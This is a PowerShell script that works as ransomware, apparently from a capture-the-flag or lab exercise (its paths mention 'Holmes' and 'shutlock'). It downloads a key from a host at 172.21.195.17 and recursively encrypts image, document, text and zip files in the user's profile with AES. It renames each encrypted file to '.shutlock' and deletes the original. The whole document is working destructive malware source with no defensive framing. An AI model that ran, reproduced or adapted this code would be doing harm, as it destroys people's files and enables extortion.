# Define the directories to search for files
$IP_addr = '172.21.195.17:5000'
$directories = @("$env:USERPROFILE")

# Define the file extensions to encrypt
$extensions = @(".png", ".doc", ".txt", ".zip")
$keyUrl = "http://$IP_addr/Holmes/key.txt"

# Download the key from the URL
$keyContent64 = Invoke-WebRequest -Uri $keyUrl | Select-Object -ExpandProperty Content
$keyContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($keyContent64))

# Use SHA-256 hash function to produce a 32-byte key
$sha256 = [System.Security.Cryptography.SHA256]::Create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($keyContent))
$iv = [System.Security.Cryptography.RijndaelManaged]::Create().IV

# Sauvegarder l'IV dans un fichier
$ivFilePath = "$env:USERPROFILE\Documents\iv"
[System.IO.File]::WriteAllBytes($ivFilePath, $iv)

# Create a new RijndaelManaged object with the specified key
$rijndael = New-Object System.Security.Cryptography.RijndaelManaged
$rijndael.Key = $key
$rijndael.IV = $iv
$rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
$rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7


# Go through each directory
foreach ($dir in $directories) {
    # Go through each file
    Get-ChildItem -Path $dir -Recurse | ForEach-Object {
        # Check the file extension
        if ($extensions -contains $_.Extension) {
            # Generate the new file name
            $newName = $_.FullName -replace $_.Extension, ".shutlock"

            # Read the file contents in bytes
            $contentBytes = [System.IO.File]::ReadAllBytes($_.FullName)

            # Create a new encryptor
            $encryptor = $rijndael.CreateEncryptor()

            # Encrypt the content
            $encryptedBytes = $encryptor.TransformFinalBlock($contentBytes, 0, $contentBytes.Length)

            # Write the encrypted content to a file
            [System.IO.File]::WriteAllBytes($newName, $encryptedBytes)

            # Delete the original file
            Remove-Item $_.FullName
        }
    }
}
